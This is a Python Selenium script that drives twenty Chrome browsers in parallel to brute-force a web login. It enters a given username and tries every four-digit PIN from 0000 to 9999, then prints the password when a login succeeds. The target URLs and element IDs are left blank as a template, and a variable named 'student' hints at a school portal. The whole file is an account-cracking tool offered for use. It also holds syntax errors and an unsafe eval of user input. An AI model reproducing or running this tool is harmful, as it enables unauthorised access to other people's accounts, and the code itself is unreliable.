from selenium.common.exceptions import NoSuchElementException
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from timeit import default_timer as timer
from selenium import webdriver
import time


#read base_code before reading this


name = input("enter username here: ")
extra = eval(input("additional specifications: "))
start = timer()


browser1 = webdriver.Chrome(executable_path=r"")#enter path here
browser1.get('')#enter website here
time.sleep(1.5)
student = browser1.find_element_by_id("")#enter navigation here
student.click()
    
browser2 = webdriver.Chrome(executable_path=r"")
browser2.get('')
time.sleep(1.5)
student = browser2.find_element_by_id("")
student.click()
    
browser3 = webdriver.Chrome(executable_path=r"")
browser3.get('')
time.sleep(1.5)
student = browser3.find_element_by_id("")
student.click()
    
browser4 = webdriver.Chrome(executable_path=r"")
browser4.get('')
time.sleep(1.5)
student = browser4.find_element_by_id("")
student.click()
    
browser5 = webdriver.Chrome(executable_path=r"")
browser5.get('')
time.sleep(1.5)
student = browser5.find_element_by_id("")
student.click()
    
browser6 = webdriver.Chrome(executable_path=r"")
browser6.get('')
time.sleep(1.5)
student = browser6.find_element_by_id("")
student.click()

browser7 = webdriver.Chrome(executable_path=r"")
browser7.get('')
time.sleep(1.5)
student = browser7.find_element_by_id("")
student.click()

browser8 = webdriver.Chrome(executable_path=r"")
browser8.get('')
time.sleep(1.5)
student = browser8.find_element_by_id("")
student.click()

browser9 = webdriver.Chrome(executable_path=r"")
browser9.get('')
time.sleep(1.5)
student = browser9.find_element_by_id("")
student.click()

browser10 = webdriver.Chrome(executable_path=r"")
browser10.get('')
time.sleep(1.5)
student = browser10.find_element_by_id("")
student.click()

browser11 = webdriver.Chrome(executable_path=r"")
browser11.get('')
time.sleep(1.5)
student = browser11.find_element_by_id("")
student.click()

browser12 = webdriver.Chrome(executable_path=r"")
browser12.get('')
time.sleep(1.5)
student = browser12.find_element_by_id("")
student.click()

browser13 = webdriver.Chrome(executable_path=r"")
browser13.get('')
time.sleep(1.5)
student = browser13.find_element_by_id("")
student.click()

browser14 = webdriver.Chrome(executable_path=r"")
browser14.get('')
time.sleep(1.5)
student = browser14.find_element_by_id("")
student.click()

browser15 = webdriver.Chrome(executable_path=r"")
browser15.get('')
time.sleep(1.5)
student = browser15.find_element_by_id("")
student.click()

browser16 = webdriver.Chrome(executable_path=r"")
browser16.get('')
time.sleep(1.5)
student = browser16.find_element_by_id("")
student.click()

browser17 = webdriver.Chrome(executable_path=r"")
browser17.get('')
time.sleep(1.5)
student = browser17.find_element_by_id("")
student.click()

browser18 = webdriver.Chrome(executable_path=r"")
browser18.get('')
time.sleep(1.5)
student = browser18.find_element_by_id("")
student.click()

browser19 = webdriver.Chrome(executable_path=r"")
browser19.get('')
time.sleep(1.5)
student = browser19.find_element_by_id("")
student.click()

browser20 = webdriver.Chrome(executable_path=r"")
browser20.get('')
time.sleep(1.5)
student = browser20.find_element_by_id("")
student.click()
  


num1 = str(0000).zfill(4)
num2 = str(500).zfill(4)
num3 = str(1000).zfill(4)
num4 = str(1500).zfill(4)
num5 = str(2000).zfill(4)
num6 = str(2500).zfill(4)
num7 = str(3000).zfill(4)
num8 = str(3500).zfill(4)
num9 = str(4000).zfill(4)
num10 = str(4500).zfill(4)
num11 = str(5000).zfill(4)
num12 = str(5500).zfill(4)
num13 = str(6000).zfill(4)
num14 = str(6500).zfill(4)
num15 = str(7000).zfill(4)
num16 = str(7500).zfill(4)
num17 = str(8000).zfill(4)
num18 = str(8500).zfill(4)
num19 = str(9000).zfill(4)
num20 = str(9500).zfill(4)
time.sleep(5)

    
if extra == :#enter what extra should be
    
    while browser1.current_url == ("") and browser2.current_url == ("") and browser3.current_url == ("")\
and browser4.current_url == ("") and browser5.current_url == ("") and browser6.current_url == ("")\
and browser7.current_url == ("") and browser8.current_url == ("") and browser9.current_url == ("")\
and browser10.current_url == ("") and int(num1)<500 and int(num2)<1000 and int(num3)<1500 and int(num4)<2000 and int(num5)<2500 and int(num6)<3000 and int(num7)<3500 and int(num8)<4000 \
and int(num9)<4500 and int(num10)<5000 and int(num11)<5500 and int(num12)<6000 and int(num13)<6500 and int(num14)<7000 and int(num15)<7500 and int(num16)<8000 and int(num17)<8500 and int(num18)<9000 and int(num19)<9500 \
and int(num20)<10000 and browser11.current_url == ("") and browser12.current_url == ("") and browser13.current_url == ("")\
and browser14.current_url == ("") and browser15.current_url == ("") and browser16.current_url == ("") \
and browser17.current_url == ("") and browser18.current_url == ("") and browser19.current_url == ("") \
and browser20.current_url == (""):#enter website in quotes
        try:
            username = browser1.find_element_by_id("UserName")
            username.clear()
            username.send_keys(name)
        except NoSuchElementException:
            pass
        try:
            password = browser1.find_element_by_id("Password")
            password.clear()
            password.send_keys("" + str(num1).zfill(4))
            password.send_keys(Keys.RETURN)
        except NoSuchElementException:
            pass
        
        num1 = int(num1) + 1
        print(str(num1).zfill(4))

        try:
            username = browser2.find_element_by_id("UserName")
            username.clear()
            username.send_keys(name)
        except NoSuchElementException:
            pass

        try:
            password = browser2.find_element_by_id("Password")
            password.clear()
            password.send_keys("" + str(num2).zfill(4))
            password.send_keys(Keys.RETURN)
        except NoSuchElementException:
            pass

        num2 = int(num2) + 1
        print(str(num2).zfill(4))
        
        try:
            username = browser3.find_element_by_id("UserName")
            username.clear()
            username.send_keys(name)
        except NoSuchElementException:
            pass

        try:
            password = browser3.find_element_by_id("Password")
            password.clear()
            password.send_keys("" + str(num3).zfill(4))
            password.send_keys(Keys.RETURN)
        except NoSuchElementException:
            pass

        num3 = int(num3) + 1
        print(num3)
        
        try:
            username = browser4.find_element_by_id("UserName")
            username.clear()
            username.send_keys(name)
        except NoSuchElementException:
            pass

        try:
            password = browser4.find_element_by_id("Password")
            password.clear()
            password.send_keys("" + str(num4).zfill(4))
            password.send_keys(Keys.RETURN)
        except NoSuchElementException:
            pass

        num4 = int(num4) + 1
        print(num4)

        try:
            username = browser5.find_element_by_id("UserName")
            username.clear()
            username.send_keys(name)
        except NoSuchElementException:
            pass

        try:
            password = browser5.find_element_by_id("Password")
            password.clear()
            password.send_keys("" + str(num5).zfill(4))
            password.send_keys(Keys.RETURN)
        except NoSuchElementException:
            pass

        num5 = int(num5) + 1
        print(num5)

        try:
            username = browser6.find_element_by_id("UserName")
            username.clear()
            username.send_keys(name)
        except NoSuchElementException:
            pass

        try:
            password = browser6.find_element_by_id("Password")
            password.clear()
            password.send_keys("" + str(num6).zfill(4))
            password.send_keys(Keys.RETURN)
        except NoSuchElementException:
            pass

        num6 = int(num6) + 1
        print(num6)

        try:
            username = browser7.find_element_by_id("UserName")
            username.clear()
            username.send_keys(name)
        except NoSuchElementException:
            pass

        try:
            password = browser7.find_element_by_id("Password")
            password.clear()
            password.send_keys("" + str(num7).zfill(4))
            password.send_keys(Keys.RETURN)
        except NoSuchElementException:
            pass

        num7 = int(num7) + 1
        print(num7)

        try:
            username = browser8.find_element_by_id("UserName")
            username.clear()
            username.send_keys(name)
        except NoSuchElementException:
            pass

        try:
            password = browser8.find_element_by_id("Password")
            password.clear()
            password.send_keys("" + str(num8).zfill(4))
            password.send_keys(Keys.RETURN)
        except NoSuchElementException:
            pass

        num8 = int(num8) + 1
        print(num8)

        try:
            username = browser9.find_element_by_id("UserName")
            username.clear()
            username.send_keys(name)
        except NoSuchElementException:
            pass

        try:
            password = browser9.find_element_by_id("Password")
            password.clear()
            password.send_keys("" + str(num9).zfill(4))
            password.send_keys(Keys.RETURN)
        except NoSuchElementException:
            pass

        num9 = int(num9) + 1
        print(num9)

        try:
            username = browser10.find_element_by_id("UserName")
            username.clear()
            username.send_keys(name)
        except NoSuchElementException:
            pass

        try:
            password = browser10.find_element_by_id("Password")
            password.clear()
            password.send_keys("" + str(num10).zfill(4))
            password.send_keys(Keys.RETURN)
        except NoSuchElementException:
            pass

        num10 = int(num10) + 1
        print(num10)
        
        try:
            username = browser11.find_element_by_id("UserName")
            username.clear()
            username.send_keys(name)
        except NoSuchElementException:
            pass
        try:
            password = browser11.find_element_by_id("Password")
            password.clear()
            password.send_keys("" + str(num11).zfill(4))
            password.send_keys(Keys.RETURN)
        except NoSuchElementException:
            pass
        
        num11 = int(num11) + 1
        print(str(num11).zfill(4))

        try:
            username = browser12.find_element_by_id("UserName")
            username.clear()
            username.send_keys(name)
        except NoSuchElementException:
            pass
        try:
            password = browser12.find_element_by_id("Password")
            password.clear()
            password.send_keys("" + str(num12).zfill(4))
            password.send_keys(Keys.RETURN)
        except NoSuchElementException:
            pass
        
        num12 = int(num12) + 1
        print(str(num12).zfill(4))

        try:
            username = browser13.find_element_by_id("UserName")
            username.clear()
            username.send_keys(name)
        except NoSuchElementException:
            pass
        try:
            password = browser13.find_element_by_id("Password")
            password.clear()
            password.send_keys("" + str(num13).zfill(4))
            password.send_keys(Keys.RETURN)
        except NoSuchElementException:
            pass
        
        num13 = int(num13) + 1
        print(str(num13).zfill(4))

        try:
            username = browser14.find_element_by_id("UserName")
            username.clear()
            username.send_keys(name)
        except NoSuchElementException:
            pass
        try:
            password = browser14.find_element_by_id("Password")
            password.clear()
            password.send_keys("" + str(num14).zfill(4))
            password.send_keys(Keys.RETURN)
        except NoSuchElementException:
            pass
        
        num14 = int(num14) + 1
        print(str(num14).zfill(4))

        try:
            username = browser15.find_element_by_id("UserName")
            username.clear()
            username.send_keys(name)
        except NoSuchElementException:
            pass
        try:
            password = browser15.find_element_by_id("Password")
            password.clear()
            password.send_keys("" + str(num15).zfill(4))
            password.send_keys(Keys.RETURN)
        except NoSuchElementException:
            pass
        
        num15 = int(num15) + 1
        print(str(num15).zfill(4))

        try:
            username = browser16.find_element_by_id("UserName")
            username.clear()
            username.send_keys(name)
        except NoSuchElementException:
            pass
        try:
            password = browser16.find_element_by_id("Password")
            password.clear()
            password.send_keys("" + str(num16).zfill(4))
            password.send_keys(Keys.RETURN)
        except NoSuchElementException:
            pass
        
        num16 = int(num16) + 1
        print(str(num16).zfill(4))

        try:
            username = browser17.find_element_by_id("UserName")
            username.clear()
            username.send_keys(name)
        except NoSuchElementException:
            pass
        try:
            password = browser17.find_element_by_id("Password")
            password.clear()
            password.send_keys("" + str(num17).zfill(4))
            password.send_keys(Keys.RETURN)
        except NoSuchElementException:
            pass
        
        num17 = int(num17) + 1
        print(str(num17).zfill(4))

        try:
            username = browser18.find_element_by_id("UserName")
            username.clear()
            username.send_keys(name)
        except NoSuchElementException:
            pass
        try:
            password = browser18.find_element_by_id("Password")
            password.clear()
            password.send_keys("" + str(num18).zfill(4))
            password.send_keys(Keys.RETURN)
        except NoSuchElementException:
            pass
        
        num18 = int(num18) + 1
        print(str(num18).zfill(4))

        try:
            username = browser19.find_element_by_id("UserName")
            username.clear()
            username.send_keys(name)
        except NoSuchElementException:
            pass
        try:
            password = browser19.find_element_by_id("Password")
            password.clear()
            password.send_keys("" + str(num19).zfill(4))
            password.send_keys(Keys.RETURN)
        except NoSuchElementException:
            pass
        
        num19 = int(num19) + 1
        print(str(num19).zfill(4))

        try:
            username = browser20.find_element_by_id("UserName")
            username.clear()
            username.send_keys(name)
        except NoSuchElementException:
            pass
        try:
            password = browser20.find_element_by_id("Password")
            password.clear()
            password.send_keys("" + str(num20).zfill(4))
            password.send_keys(Keys.RETURN)
        except NoSuchElementException:
            pass
        
        num20 = int(num20) + 1
        print(str(num20).zfill(4))



        
    if browser1.current_url == (""):
        num1 = int(num1) - 1
        end = timer()
        print("The username is " + name)
        print("The password is:" + "" + str(num1).zfill(4))
        print("The program took " + str(int(end) - int(start)) + " seconds to finish")
    if browser2.current_url == (""):
        num2 = int(num2) - 1
        end = timer()
        print("The username is " + name)
        print("The password is:" + "" + str(num2).zfill(4))
        print("The program took " + str(int(end) - int(start)) + " seconds to finish")
    if browser3.current_url == (""):
        num3 = int(num3) - 1
        end = timer()
        print("The username is " + name)
        print("The password is:" + "" + str(num3).zfill(4))
        print("The program took " + str(int(end) - int(start)) + " seconds to finish")
    if browser4.current_url == (""):
        num4 = int(num4) - 1
        end = timer()
        print("The username is " + name)
        print("The password is:" + "" + str(num4).zfill(4))
        print("The program took " + str(int(end) - int(start)) + " seconds to finish")
    if browser5.current_url == (""):
        num5 = int(num5) - 1
        end = timer()
        print("The username is " + name)
        print("The password is:" + "" + str(num5).zfill(4))
        print("The program took " + str(int(end) - int(start)) + " seconds to finish")
    if browser6.current_url == (""):
        num6 = int(num6) - 1
        end = timer()
        print("The username is " + name)
        print("The password is:" + "" + str(num6).zfill(4))
        print("The program took " + str(int(end) - int(start)) + " seconds to finish")
    if browser7.current_url == (""):
        num7 = int(num7) - 1
        end = timer()
        print("The username is " + name)
        print("The password is:" + "" + str(num7).zfill(4))
        print("The program took " + str(int(end) - int(start)) + " seconds to finish")
    if browser8.current_url == (""):
        num8 = int(num8) - 1
        end = timer()
        print("The username is " + name)
        print("The password is:" + "" + str(num8).zfill(4))
        print("The program took " + str(int(end) - int(start)) + " seconds to finish")
    if browser9.current_url == (""):
        num9 = int(num9) - 1
        end = timer()
        print("The username is " + name)
        print("The password is:" + "" + str(num9).zfill(4))
        print("The program took " + str(int(end) - int(start)) + " seconds to finish")
    if browser10.current_url == (""):
        num10 = int(num10) - 1
        end = timer()
        print("The username is " + name)
        print("The password is:" + "" + str(num10).zfill(4))
        print("The program took " + str(int(end) - int(start)) + " seconds to finish")
    if browser11.current_url == (""):
        num11 = int(num11) - 1
        end = timer()
        print("The username is " + name)
        print("The password is:" + "" + str(num11).zfill(4))
        print("The program took " + str(int(end) - int(start)) + " minutes to finish")
    if browser12.current_url == (""):
        num12 = int(num12) - 1
        end = timer()
        print("The username is " + name)
        print("The password is:" + "" + str(num12).zfill(4))
        print("The program took " + str(int(end) - int(start)) + " seconds to finish")
    if browser13.current_url == (""):
        num13 = int(num13) - 1
        end = timer()
        print("The username is " + name)
        print("The password is:" + "" + str(num13).zfill(4))
        print("The program took " + str(int(end) - int(start)) + " seconds to finish")
    if browser14.current_url == (""):
        num14 = int(num14) - 1
        end = timer()
        print("The username is " + name)
        print("The password is:" + "" + str(num14).zfill(4))
        print("The program took " + str(int(end) - int(start)) + " seconds to finish")
    if browser15.current_url == (""):
        num15 = int(num15) - 1
        end = timer()
        print("The username is " + name)
        print("The password is:" + "" + str(num15).zfill(4))
        print("The program took " + str(int(end) - int(start)) + " seconds to finish")
    if browser16.current_url == (""):
        num16 = int(num16) - 1
        end = timer()
        print("The username is " + name)
        print("The password is:" + "" + str(num16).zfill(4))
        print("The program took " + str(int(end) - int(start)) + " seconds to finish")
    if browser17.current_url == (""):
        num17 = int(num17) - 1
        end = timer()
        print("The username is " + name)
        print("The password is:" + "" + str(num17).zfill(4))
        print("The program took " + str(int(end) - int(start)) + " seconds to finish")
    if browser18.current_url == (""):
        num18 = int(num18) - 1
        end = timer()
        print("The username is " + name)
        print("The password is:" + "" + str(num18).zfill(4))
        print("The program took " + str(int(end) - int(start)) + " seconds to finish")
    if browser19.current_url == (""):
        num19 = int(num19) - 1
        end = timer()
        print("The username is " + name)
        print("The password is:" + "" + str(num19).zfill(4))
        print("The program took " + str(int(end) - int(start)) + " seconds to finish")
    if browser20.current_url == (""):
        num20 = int(num20) - 1
        end = timer()
        print("The username is " + name)
        print("The password is:" + "" + str(num20).zfill(4))
        print("The program took " + str(int(end) - int(start)) + " seconds to finish")


        
    if  browser1.current_url != ("") and browser2.current_url != ("")\ #enter the url after logged in here
and browser3.current_url != ("") and browser4.current_url != ("") \
and browser5.current_url != ("") and browser6.current_url != ("") and \
browser7.current_url != ("") and browser8.current_url != ("") and \
browser9.current_url != ("") and browser10.current_url != ("") and \
browser11.current_url != ("") and browser12.current_url != ("") and \
browser13.current_url != ("") and browser14.current_url != ("") and \
browser15.current_url != ("") and browser16.current_url != ("") and \
browser17.current_url != ("") and browser18.current_url != ("") and \
browser19.current_url != ("") and browser20.current_url != (""):
        print("There has been an error please try again")







    
elif extra:#put other specifications here, can keep going here as well
    
    while browser1.current_url == ("") and browser2.current_url == ("") and browser3.current_url == ("")\
and browser4.current_url == ("") and browser5.current_url == ("") and browser6.current_url == ("")\
and browser7.current_url == ("") and browser8.current_url == ("") and browser9.current_url == ("")\
and browser10.current_url == ("") and int(num1)<500 and int(num2)<1000 and int(num3)<1500 and int(num4)<2000 and int(num5)<2500 and int(num6)<3000 and int(num7)<3500 and int(num8)<4000 \
and int(num9)<4500 and int(num10)<5000 and int(num11)<5500 and int(num12)<6000 and int(num13)<6500 and int(num14)<7000 and int(num15)<7500 and int(num16)<8000 and int(num17)<8500 and int(num18)<9000 and int(num19)<9500 \
and int(num20)<10000 and browser11.current_url == ("") and browser12.current_url == ("") and browser13.current_url == ("")\
and browser14.current_url == ("") and browser15.current_url == ("") and browser16.current_url == ("") \
and browser17.current_url == ("") and browser18.current_url == ("") and browser19.current_url == ("") \
and browser20.current_url == (""):#enter website in quotes
        try:
            username = browser1.find_element_by_id("UserName")
            username.clear()
            username.send_keys(name)
        except NoSuchElementException:
            pass
        try:
            password = browser1.find_element_by_id("Password")
            password.clear()
            password.send_keys("" + str(num1).zfill(4))
            password.send_keys(Keys.RETURN)
        except NoSuchElementException:
            pass
        
        num1 = int(num1) + 1
        print(str(num1).zfill(4))

        try:
            username = browser2.find_element_by_id("UserName")
            username.clear()
            username.send_keys(name)
        except NoSuchElementException:
            pass

        try:
            password = browser2.find_element_by_id("Password")
            password.clear()
            password.send_keys("" + str(num2).zfill(4))
            password.send_keys(Keys.RETURN)
        except NoSuchElementException:
            pass

        num2 = int(num2) + 1
        print(str(num2).zfill(4))
        
        try:
            username = browser3.find_element_by_id("UserName")
            username.clear()
            username.send_keys(name)
        except NoSuchElementException:
            pass

        try:
            password = browser3.find_element_by_id("Password")
            password.clear()
            password.send_keys("" + str(num3).zfill(4))
            password.send_keys(Keys.RETURN)
        except NoSuchElementException:
            pass

        num3 = int(num3) + 1
        print(num3)
        
        try:
            username = browser4.find_element_by_id("UserName")
            username.clear()
            username.send_keys(name)
        except NoSuchElementException:
            pass

        try:
            password = browser4.find_element_by_id("Password")
            password.clear()
            password.send_keys("" + str(num4).zfill(4))
            password.send_keys(Keys.RETURN)
        except NoSuchElementException:
            pass

        num4 = int(num4) + 1
        print(num4)

        try:
            username = browser5.find_element_by_id("UserName")
            username.clear()
            username.send_keys(name)
        except NoSuchElementException:
            pass

        try:
            password = browser5.find_element_by_id("Password")
            password.clear()
            password.send_keys("" + str(num5).zfill(4))
            password.send_keys(Keys.RETURN)
        except NoSuchElementException:
            pass

        num5 = int(num5) + 1
        print(num5)

        try:
            username = browser6.find_element_by_id("UserName")
            username.clear()
            username.send_keys(name)
        except NoSuchElementException:
            pass

        try:
            password = browser6.find_element_by_id("Password")
            password.clear()
            password.send_keys("" + str(num6).zfill(4))
            password.send_keys(Keys.RETURN)
        except NoSuchElementException:
            pass

        num6 = int(num6) + 1
        print(num6)

        try:
            username = browser7.find_element_by_id("UserName")
            username.clear()
            username.send_keys(name)
        except NoSuchElementException:
            pass

        try:
            password = browser7.find_element_by_id("Password")
            password.clear()
            password.send_keys("" + str(num7).zfill(4))
            password.send_keys(Keys.RETURN)
        except NoSuchElementException:
            pass

        num7 = int(num7) + 1
        print(num7)

        try:
            username = browser8.find_element_by_id("UserName")
            username.clear()
            username.send_keys(name)
        except NoSuchElementException:
            pass

        try:
            password = browser8.find_element_by_id("Password")
            password.clear()
            password.send_keys("" + str(num8).zfill(4))
            password.send_keys(Keys.RETURN)
        except NoSuchElementException:
            pass

        num8 = int(num8) + 1
        print(num8)

        try:
            username = browser9.find_element_by_id("UserName")
            username.clear()
            username.send_keys(name)
        except NoSuchElementException:
            pass

        try:
            password = browser9.find_element_by_id("Password")
            password.clear()
            password.send_keys("" + str(num9).zfill(4))
            password.send_keys(Keys.RETURN)
        except NoSuchElementException:
            pass

        num9 = int(num9) + 1
        print(num9)

        try:
            username = browser10.find_element_by_id("UserName")
            username.clear()
            username.send_keys(name)
        except NoSuchElementException:
            pass

        try:
            password = browser10.find_element_by_id("Password")
            password.clear()
            password.send_keys("" + str(num10).zfill(4))
            password.send_keys(Keys.RETURN)
        except NoSuchElementException:
            pass

        num10 = int(num10) + 1
        print(num10)
        
        try:
            username = browser11.find_element_by_id("UserName")
            username.clear()
            username.send_keys(name)
        except NoSuchElementException:
            pass
        try:
            password = browser11.find_element_by_id("Password")
            password.clear()
            password.send_keys("" + str(num11).zfill(4))
            password.send_keys(Keys.RETURN)
        except NoSuchElementException:
            pass
        
        num11 = int(num11) + 1
        print(str(num11).zfill(4))

        try:
            username = browser12.find_element_by_id("UserName")
            username.clear()
            username.send_keys(name)
        except NoSuchElementException:
            pass
        try:
            password = browser12.find_element_by_id("Password")
            password.clear()
            password.send_keys("" + str(num12).zfill(4))
            password.send_keys(Keys.RETURN)
        except NoSuchElementException:
            pass
        
        num12 = int(num12) + 1
        print(str(num12).zfill(4))

        try:
            username = browser13.find_element_by_id("UserName")
            username.clear()
            username.send_keys(name)
        except NoSuchElementException:
            pass
        try:
            password = browser13.find_element_by_id("Password")
            password.clear()
            password.send_keys("" + str(num13).zfill(4))
            password.send_keys(Keys.RETURN)
        except NoSuchElementException:
            pass
        
        num13 = int(num13) + 1
        print(str(num13).zfill(4))

        try:
            username = browser14.find_element_by_id("UserName")
            username.clear()
            username.send_keys(name)
        except NoSuchElementException:
            pass
        try:
            password = browser14.find_element_by_id("Password")
            password.clear()
            password.send_keys("" + str(num14).zfill(4))
            password.send_keys(Keys.RETURN)
        except NoSuchElementException:
            pass
        
        num14 = int(num14) + 1
        print(str(num14).zfill(4))

        try:
            username = browser15.find_element_by_id("UserName")
            username.clear()
            username.send_keys(name)
        except NoSuchElementException:
            pass
        try:
            password = browser15.find_element_by_id("Password")
            password.clear()
            password.send_keys("" + str(num15).zfill(4))
            password.send_keys(Keys.RETURN)
        except NoSuchElementException:
            pass
        
        num15 = int(num15) + 1
        print(str(num15).zfill(4))

        try:
            username = browser16.find_element_by_id("UserName")
            username.clear()
            username.send_keys(name)
        except NoSuchElementException:
            pass
        try:
            password = browser16.find_element_by_id("Password")
            password.clear()
            password.send_keys("" + str(num16).zfill(4))
            password.send_keys(Keys.RETURN)
        except NoSuchElementException:
            pass
        
        num16 = int(num16) + 1
        print(str(num16).zfill(4))

        try:
            username = browser17.find_element_by_id("UserName")
            username.clear()
            username.send_keys(name)
        except NoSuchElementException:
            pass
        try:
            password = browser17.find_element_by_id("Password")
            password.clear()
            password.send_keys("" + str(num17).zfill(4))
            password.send_keys(Keys.RETURN)
        except NoSuchElementException:
            pass
        
        num17 = int(num17) + 1
        print(str(num17).zfill(4))

        try:
            username = browser18.find_element_by_id("UserName")
            username.clear()
            username.send_keys(name)
        except NoSuchElementException:
            pass
        try:
            password = browser18.find_element_by_id("Password")
            password.clear()
            password.send_keys("" + str(num18).zfill(4))
            password.send_keys(Keys.RETURN)
        except NoSuchElementException:
            pass
        
        num18 = int(num18) + 1
        print(str(num18).zfill(4))

        try:
            username = browser19.find_element_by_id("UserName")
            username.clear()
            username.send_keys(name)
        except NoSuchElementException:
            pass
        try:
            password = browser19.find_element_by_id("Password")
            password.clear()
            password.send_keys("" + str(num19).zfill(4))
            password.send_keys(Keys.RETURN)
        except NoSuchElementException:
            pass
        
        num19 = int(num19) + 1
        print(str(num19).zfill(4))

        try:
            username = browser20.find_element_by_id("UserName")
            username.clear()
            username.send_keys(name)
        except NoSuchElementException:
            pass
        try:
            password = browser20.find_element_by_id("Password")
            password.clear()
            password.send_keys("" + str(num20).zfill(4))
            password.send_keys(Keys.RETURN)
        except NoSuchElementException:
            pass
        
        num20 = int(num20) + 1
        print(str(num20).zfill(4))



        
    if browser1.current_url == (""):
        num1 = int(num1) - 1
        end = timer()
        print("The username is " + name)
        print("The password is:" + "" + str(num1).zfill(4))
        print("The program took " + str(int(end) - int(start)) + " seconds to finish")
    if browser2.current_url == (""):
        num2 = int(num2) - 1
        end = timer()
        print("The username is " + name)
        print("The password is:" + "" + str(num2).zfill(4))
        print("The program took " + str(int(end) - int(start)) + " seconds to finish")
    if browser3.current_url == (""):
        num3 = int(num3) - 1
        end = timer()
        print("The username is " + name)
        print("The password is:" + "" + str(num3).zfill(4))
        print("The program took " + str(int(end) - int(start)) + " seconds to finish")
    if browser4.current_url == (""):
        num4 = int(num4) - 1
        end = timer()
        print("The username is " + name)
        print("The password is:" + "" + str(num4).zfill(4))
        print("The program took " + str(int(end) - int(start)) + " seconds to finish")
    if browser5.current_url == (""):
        num5 = int(num5) - 1
        end = timer()
        print("The username is " + name)
        print("The password is:" + "" + str(num5).zfill(4))
        print("The program took " + str(int(end) - int(start)) + " seconds to finish")
    if browser6.current_url == (""):
        num6 = int(num6) - 1
        end = timer()
        print("The username is " + name)
        print("The password is:" + "" + str(num6).zfill(4))
        print("The program took " + str(int(end) - int(start)) + " seconds to finish")
    if browser7.current_url == (""):
        num7 = int(num7) - 1
        end = timer()
        print("The username is " + name)
        print("The password is:" + "" + str(num7).zfill(4))
        print("The program took " + str(int(end) - int(start)) + " seconds to finish")
    if browser8.current_url == (""):
        num8 = int(num8) - 1
        end = timer()
        print("The username is " + name)
        print("The password is:" + "" + str(num8).zfill(4))
        print("The program took " + str(int(end) - int(start)) + " seconds to finish")
    if browser9.current_url == (""):
        num9 = int(num9) - 1
        end = timer()
        print("The username is " + name)
        print("The password is:" + "" + str(num9).zfill(4))
        print("The program took " + str(int(end) - int(start)) + " seconds to finish")
    if browser10.current_url == (""):
        num10 = int(num10) - 1
        end = timer()
        print("The username is " + name)
        print("The password is:" + "" + str(num10).zfill(4))
        print("The program took " + str(int(end) - int(start)) + " seconds to finish")
    if browser11.current_url == (""):
        num11 = int(num11) - 1
        end = timer()
        print("The username is " + name)
        print("The password is:" + "" + str(num11).zfill(4))
        print("The program took " + str(int(end) - int(start)) + " minutes to finish")
    if browser12.current_url == (""):
        num12 = int(num12) - 1
        end = timer()
        print("The username is " + name)
        print("The password is:" + "" + str(num12).zfill(4))
        print("The program took " + str(int(end) - int(start)) + " seconds to finish")
    if browser13.current_url == (""):
        num13 = int(num13) - 1
        end = timer()
        print("The username is " + name)
        print("The password is:" + "" + str(num13).zfill(4))
        print("The program took " + str(int(end) - int(start)) + " seconds to finish")
    if browser14.current_url == (""):
        num14 = int(num14) - 1
        end = timer()
        print("The username is " + name)
        print("The password is:" + "" + str(num14).zfill(4))
        print("The program took " + str(int(end) - int(start)) + " seconds to finish")
    if browser15.current_url == (""):
        num15 = int(num15) - 1
        end = timer()
        print("The username is " + name)
        print("The password is:" + "" + str(num15).zfill(4))
        print("The program took " + str(int(end) - int(start)) + " seconds to finish")
    if browser16.current_url == (""):
        num16 = int(num16) - 1
        end = timer()
        print("The username is " + name)
        print("The password is:" + "" + str(num16).zfill(4))
        print("The program took " + str(int(end) - int(start)) + " seconds to finish")
    if browser17.current_url == (""):
        num17 = int(num17) - 1
        end = timer()
        print("The username is " + name)
        print("The password is:" + "" + str(num17).zfill(4))
        print("The program took " + str(int(end) - int(start)) + " seconds to finish")
    if browser18.current_url == (""):
        num18 = int(num18) - 1
        end = timer()
        print("The username is " + name)
        print("The password is:" + "" + str(num18).zfill(4))
        print("The program took " + str(int(end) - int(start)) + " seconds to finish")
    if browser19.current_url == (""):
        num19 = int(num19) - 1
        end = timer()
        print("The username is " + name)
        print("The password is:" + "" + str(num19).zfill(4))
        print("The program took " + str(int(end) - int(start)) + " seconds to finish")
    if browser20.current_url == (""):
        num20 = int(num20) - 1
        end = timer()
        print("The username is " + name)
        print("The password is:" + "" + str(num20).zfill(4))
        print("The program took " + str(int(end) - int(start)) + " seconds to finish")


        
    if  browser1.current_url != ("") and browser2.current_url != ("")\ #enter the url after logged in here
and browser3.current_url != ("") and browser4.current_url != ("") \
and browser5.current_url != ("") and browser6.current_url != ("") and \
browser7.current_url != ("") and browser8.current_url != ("") and \
browser9.current_url != ("") and browser10.current_url != ("") and \
browser11.current_url != ("") and browser12.current_url != ("") and \
browser13.current_url != ("") and browser14.current_url != ("") and \
browser15.current_url != ("") and browser16.current_url != ("") and \
browser17.current_url != ("") and browser18.current_url != ("") and \
browser19.current_url != ("") and browser20.current_url != (""):
        print("There has been an error please try again")



        
else:
    print("your specification is not valid")
    




browser1.close()
browser2.close()
browser3.close()
browser4.close()
browser5.close()
browser6.close()
browser7.close()
browser8.close()
browser9.close()
browser10.close()
browser11.close()
browser12.close()
browser13.close()
browser14.close()
browser15.close()
browser16.close()
browser17.close()
browser18.close()
browser19.close()
browser20.close()
